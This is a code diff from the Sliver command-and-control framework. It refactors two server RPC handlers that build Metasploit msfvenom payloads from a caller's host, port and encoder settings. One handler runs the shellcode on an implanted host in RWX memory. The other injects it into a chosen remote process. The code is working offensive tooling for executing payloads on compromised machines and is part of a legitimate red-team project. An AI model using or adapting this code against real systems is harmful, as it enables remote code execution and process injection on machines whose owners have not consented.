@@ -19,91 +19,84 @@ package rpc
 */
 
 import (
+	"context"
 	"time"
 
-	clientpb "github.com/bishopfox/sliver/protobuf/clientpb"
-	sliverpb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
 	"github.com/bishopfox/sliver/server/core"
 	"github.com/bishopfox/sliver/server/msf"
 
 	"github.com/golang/protobuf/proto"
 )
 
-func rpcMsf(req []byte, timeout time.Duration, resp RPCResponse) {
-	msfReq := &clientpb.MSFReq{}
-	err := proto.Unmarshal(req, msfReq)
-	if err != nil {
-		resp([]byte{}, err)
-		return
-	}
-
-	sliver := core.Hive.Sliver(msfReq.SliverID)
-	if sliver == nil {
-		resp([]byte{}, err)
-		return
+// Msf - Helper function to execute MSF payloads on the remote system
+func (rpc *Server) Msf(ctx context.Context, req *clientpb.MSFReq) (*commonpb.Empty, error) {
+	session := core.Hive.Sliver(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
 	}
 
 	config := msf.VenomConfig{
-		Os:         sliver.Os,
-		Arch:       msf.Arch(sliver.Arch),
-		Payload:    msfReq.Payload,
-		LHost:      msfReq.LHost,
-		LPort:      uint16(msfReq.LPort),
-		Encoder:    msfReq.Encoder,
-		Iterations: int(msfReq.Iterations),
+		Os:         session.Os,
+		Arch:       msf.Arch(session.Arch),
+		Payload:    req.Payload,
+		LHost:      req.LHost,
+		LPort:      uint16(req.LPort),
+		Encoder:    req.Encoder,
+		Iterations: int(req.Iterations),
 		Format:     "raw",
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
 		rpcLog.Warnf("Error while generating msf payload: %v\n", err)
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.Task{
+	data, _ := proto.Marshal(&sliverpb.TaskReq{
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
 	})
-	data, err = sliver.Request(sliverpb.MsgTask, timeout, data)
-	resp(data, err)
+	timeout := time.Duration(req.Request.Timeout)
+	_, err = session.Request(sliverpb.MsgTaskReq, timeout, data)
+	if err != nil {
+		return nil, err
+	}
+	return &commonpb.Empty{}, nil
 }
 
-func rpcMsfInject(req []byte, timeout time.Duration, resp RPCResponse) {
-	msfReq := &clientpb.MSFInjectReq{}
-	err := proto.Unmarshal(req, msfReq)
-	if err != nil {
-		resp([]byte{}, err)
-		return
-	}
-
-	sliver := core.Hive.Sliver(msfReq.SliverID)
-	if sliver == nil {
-		resp([]byte{}, err)
-		return
+// MsfRemote - Inject an MSF payload into a remote process
+func (rpc *Server) MsfRemote(ctx context.Context, req *clientpb.MSFRemoteReq) (*commonpb.Empty, error) {
+	session := core.Hive.Sliver(req.Request.SessionID)
+	if session == nil {
+		return nil, ErrInvalidSessionID
 	}
 
 	config := msf.VenomConfig{
-		Os:         sliver.Os,
-		Arch:       msf.Arch(sliver.Arch),
-		Payload:    msfReq.Payload,
-		LHost:      msfReq.LHost,
-		LPort:      uint16(msfReq.LPort),
-		Encoder:    msfReq.Encoder,
-		Iterations: int(msfReq.Iterations),
+		Os:         session.Os,
+		Arch:       msf.Arch(session.Arch),
+		Payload:    req.Payload,
+		LHost:      req.LHost,
+		LPort:      uint16(req.LPort),
+		Encoder:    req.Encoder,
+		Iterations: int(req.Iterations),
 		Format:     "raw",
 	}
 	rawPayload, err := msf.VenomPayload(config)
 	if err != nil {
-		rpcLog.Errorf("Error while generating msf payload: %v\n", err)
-		resp([]byte{}, err)
-		return
+		return nil, err
 	}
-	data, _ := proto.Marshal(&sliverpb.RemoteTask{
-		Pid:      msfReq.PID,
+	data, _ := proto.Marshal(&sliverpb.RemoteTaskReq{
+		Pid:      req.PID,
 		Encoder:  "raw",
 		Data:     rawPayload,
 		RWXPages: true,
 	})
-	data, err = sliver.Request(sliverpb.MsgRemoteTask, timeout, data)
-	resp(data, err)
+	timeout := time.Duration(req.Request.Timeout)
+	_, err = session.Request(sliverpb.MsgRemoteTaskReq, timeout, data)
+	if err != nil {
+		return nil, err
+	}
+	return &commonpb.Empty{}, nil
 }
